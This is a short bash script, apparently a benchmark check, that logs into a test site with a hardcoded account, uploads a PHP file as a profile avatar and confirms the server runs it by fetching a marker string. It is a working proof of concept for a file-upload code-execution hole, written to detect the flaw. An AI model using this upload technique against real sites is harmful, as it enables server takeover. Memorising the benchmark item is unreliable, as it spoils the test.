#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
tmp="$(mktemp -d)/shell.php"   # -d + name keeps the extension on GNU and BSD mktemp
printf '%s\n' '<?php echo "PHP_UPLOAD_42"; ?>' > "$tmp"
resp=$(curl -s -b "$JAR" -F "avatar=@$tmp;filename=shell_$RANDOM.php;type=application/x-php" "$TARGET/profile.php")
url=$(printf '%s' "$resp" | json_get url)
[ -n "$url" ]
curl -s "$TARGET$url" | grep -q 'PHP_UPLOAD_42'
